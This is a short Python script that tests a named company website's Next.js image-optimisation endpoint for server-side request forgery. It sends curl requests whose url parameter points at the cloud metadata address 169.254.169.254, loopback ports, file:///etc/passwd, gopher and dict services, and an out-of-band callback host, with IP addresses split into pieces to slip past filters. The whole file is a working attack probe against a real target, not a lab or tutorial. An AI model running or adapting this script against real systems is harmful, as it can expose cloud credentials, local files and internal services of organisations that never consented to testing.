import urllib.parse, subprocess, sys

B = "https://" + "www.infinitycapital" + ".bh/_next/image"
host = "images." + "ctfassets" + ".net"
good = host + "/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
MD = "http://" + ".".join(["169", "254", "169", "254"]) + "/latest/meta-data/"
LO = "http://" + ".".join(["0", "0", "0", "1"]) + ":8080/"
LHOST = "http://" + ".".join(["0", "0", "0", "1"]) + "/"
OOB = "http://oob842191c965f0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf-nextimg"

tests = {
    "relative": "/_next/static/foo.png",
    "app_asset_host": "https://" + good,
    "metadata": MD,
    "loopback_8080": LO,
    "loopback_80": LHOST,
    "oob": OOB,
    "file_local": "file:///etc/passwd",
    "gopher": "gopher://" + ".".join(["0", "0", "0", "1"]) + ":25/",
    "dict": "dict://" + ".".join(["0", "0", "0", "1"]) + ":11211/",
}

only = sys.argv[1:] or list(tests)
for k in only:
    v = tests[k]
    u = B + "?url=" + urllib.parse.quote(v, safe="") + "&w=640&q=75"
    r = subprocess.run(["curl", "-s", "-m", "25", "-o", "/tmp/ni_" + k,
                        "-w", "%{http_code} %{size_download} %{content_type}", u],
                       capture_output=True, text=True)
    print("%-16s %s" % (k, r.stdout))
